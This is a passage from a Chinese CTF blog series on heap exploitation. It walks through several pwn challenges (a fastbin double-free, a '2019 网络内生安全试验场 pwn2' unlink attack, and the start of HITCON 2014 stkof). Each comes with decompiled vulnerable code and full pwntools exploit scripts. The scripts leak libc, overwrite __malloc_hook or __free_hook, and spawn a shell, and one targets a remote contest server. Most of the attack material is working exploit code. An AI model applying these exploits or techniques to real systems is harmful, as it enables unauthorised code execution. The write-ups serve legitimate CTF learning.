class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    ptr = <span class="number">0x00000000006020E0</span><span class="number">-0x20</span><span class="number">-0x30</span><span class="number">-0x6</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">"a"</span>, <span class="string">"0"</span>) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">"b"</span>, <span class="string">"1"</span>) <span class="comment">#1</span></span><br><span class="line">    delete(<span class="number">0</span>) </span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x30</span>, p64(ptr), <span class="string">'2'</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'3'</span>) <span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'4'</span>) <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">'a'</span>*<span class="number">0x20</span> + <span class="string">'b'</span>*<span class="number">5</span> , <span class="string">'5'</span>)<span class="comment">#5</span></span><br><span class="line">    show()</span><br><span class="line">    io.recvuntil(<span class="string">"bbbbb"</span>)</span><br><span class="line">    stdout_addr = u64(io.recvuntil(<span class="string">"Level"</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    stdout_addr = hex(stdout_addr)[:<span class="number">-2</span>]</span><br><span class="line">    stdout_addr = int(stdout_addr, <span class="number">16</span>)</span><br><span class="line">    io.success(<span class="string">"stdout_addr: 0x%x"</span> % stdout_addr)</span><br><span class="line">    </span><br><span class="line">    libc_base = stdout_addr - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">    realloc_addr = libc_base + libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x45216</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4526a</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0xf02a4</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    ptr = malloc_hook<span class="number">-0x20</span><span class="number">-0x3</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">"a"</span>, <span class="string">"6"</span>)<span class="comment">#6</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">"b"</span>, <span class="string">"7"</span>)<span class="comment">#7</span></span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">0x60</span>, p64(ptr), <span class="string">'8'</span>) <span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'9'</span>) <span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'10'</span>) <span class="comment">#10</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'c'</span>*<span class="number">0x10</span>+ <span class="string">'d'</span>*<span class="number">0x3</span> + p64(one_gadget), <span class="string">'6'</span>)</span><br><span class="line">    io.success(<span class="string">"malloc_hook: 0x%x"</span> % malloc_hook)</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base )</span><br><span class="line">    io.success(<span class="string">"one_gadget: 0x%x"</span> % one_gadget)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#add(0x30, 'a'*0x20+'b'*5,'3')</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2019-网络内生安全试验场-pwn2"><a href="#2019-网络内生安全试验场-pwn2" class="headerlink" title="2019 网络内生安全试验场 pwn2"></a>2019 网络内生安全试验场 pwn2</h2><p>实战中遇到最简单的一道了？</p>
<h3 id="功能分析-2"><a href="#功能分析-2" class="headerlink" title="功能分析"></a>功能分析</h3><ol>
<li>new一个新堆块</li>
<li>删除一个堆块</li>
<li>展示一个堆块</li>
<li>修改堆块内容，有趣的是，他是固定大小0x100?</li>
<li>退出</li>
</ol>
<h3 id="漏洞点分析-2"><a href="#漏洞点分析-2" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">record</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"record which?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( buf[v1] != <span class="number">0L</span>L &amp;&amp; v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"content?"</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf[v1], <span class="number">0x100</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是固定大小，所以申请小堆块可以溢出</p>
<h3 id="漏洞利用过程-2"><a href="#漏洞利用过程-2" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol>
<li><p>我的思路是溢出后unlink，然后在将两个堆块串联起来，unlink里介绍的手法，就是一个堆块指向另一个堆块存指针的地方，然后编辑一个堆块就是编辑地址，编辑另一个堆块就是编辑内容</p>
</li>
<li><p>初始化操作</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"please input the size :\n"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"delete which ?\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"show which ?\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">record</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"record which?\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"content?\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"5"</span>)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>unlink</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0x6020c0</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x40</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">record(<span class="number">0</span>, payload)</span><br><span class="line">record(<span class="number">1</span>, <span class="string">"1"</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#show(0)</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>链接两个堆块</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x6020c8</span>+<span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">record(<span class="number">0</span>, payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>泄露地址</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">"the content is :"</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br></pre></td></tr></table></figure>

<ol start="6">
<li>getshell</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">record(<span class="number">3</span>, <span class="string">"/bin/sh"</span>)</span><br><span class="line">record(<span class="number">0</span>, p64(free_hook))</span><br><span class="line">record(<span class="number">2</span>, p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>



<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'pwn2'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'39.106.94.18'</span></span><br><span class="line">port = <span class="number">32768</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'pwn2'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"please input the size :\n"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"delete which ?\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"show which ?\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">record</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"record which?\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"content?\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    ptr = <span class="number">0x6020c0</span></span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x40</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x40</span>)</span><br><span class="line">    payload += p64(<span class="number">0x40</span>)</span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    record(<span class="number">0</span>, payload)</span><br><span class="line">    record(<span class="number">1</span>, <span class="string">"1"</span>*<span class="number">0x10</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#show(0)</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x6020c8</span>+<span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">    record(<span class="number">0</span>, payload)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"the content is :"</span>)</span><br><span class="line">    io.recvline()</span><br><span class="line">    puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    </span><br><span class="line">    record(<span class="number">3</span>, <span class="string">"/bin/sh"</span>)</span><br><span class="line">    record(<span class="number">0</span>, p64(free_hook))</span><br><span class="line">    record(<span class="number">2</span>, p64(system_addr))</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#delete(0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="题目下载地址"><a href="#题目下载地址" class="headerlink" title="题目下载地址"></a>题目下载地址</h2><p><a href="https://github.com/NoOne-hub/ctf-save" target="_blank" rel="noopener">点我，快点我</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实操的时候发觉自己点是知道了，找漏洞点能力还待提升，利用起来也是得多调试下</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/pwn/pwn-heap-learn-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/pwn/pwn-heap-learn-4/" itemprop="url">pwn/pwn-heap-learn-4</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:25+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="pwn堆入门系列教程4"><a href="#pwn堆入门系列教程4" class="headerlink" title="pwn堆入门系列教程4"></a>pwn堆入门系列教程4</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn堆入门系列教程2</a><br><a href="https://xz.aliyun.com/t/6252" target="_blank" rel="noopener">pwn堆入门系列教程3</a></p>
<p>序言：这次进入到unlink的学习了，unlink在第一节已经用上了，但我用起来还不是很流畅，还是去翻了第一节的笔记，最主要是指针的问题，可能没学好指针，理解了unlink后就简单做了</p>
<h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><ol>
<li>几乎无输出的题目</li>
<li>申请功能，申请指定大小size</li>
<li>删除功能，删除idx位置处的chunk</li>
<li>输出一些无用字符串，有个strlen，本来想用来做/bin/sh的，发觉也不行</li>
<li>编辑功能</li>
</ol>
<h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">fill</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  idx = atol(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !globals[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  size = atoll(&amp;s);</span><br><span class="line">  ptr = globals[idx];</span><br><span class="line">  <span class="keyword">for</span> ( i = fread(ptr, <span class="number">1u</span>LL, size, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1u</span>LL, size, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    size -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( size )</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fill函数里也就是编辑功能处可以自定大小编辑，也就是说存在堆溢出</p>
<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>这里有个小细节，自己补充下知识，关于缓冲区的问题，这个细节也解决了我自己出pwn题的时候输出，为什么输出不了的问题<br>就是如果未设置缓冲区为0的话，这道题里是第一次调用fgets是要先申请1024大小的堆块作为缓冲区的，还有printf也要申请1024大小的堆块作为缓冲区</p>
<p><a href="https://paper.seebug.org/450/" target="_blank" rel="noopener">知道创宇讲解的一道题目</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">ctf-wiki讲解这部分知识</a></p>
<ol>
<li>首先先申请一块内存，冲掉printf和fgets所需缓冲区</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">ptr = <span class="number">0x0000000000602140</span>+<span class="number">0x10</span></span><br><span class="line">alloc(<span class="number">0x100</span>) <span class="comment">#idx1</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>是unlink部分，当然用unlink方法来解了，第一节学过了，伪造一个chunk，然后通过溢出覆盖第二个堆块的pre_size和size，在free第二个堆块的时候就会unlink我们的伪造的p堆块</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x30</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x30</span>) <span class="comment">#idx4</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

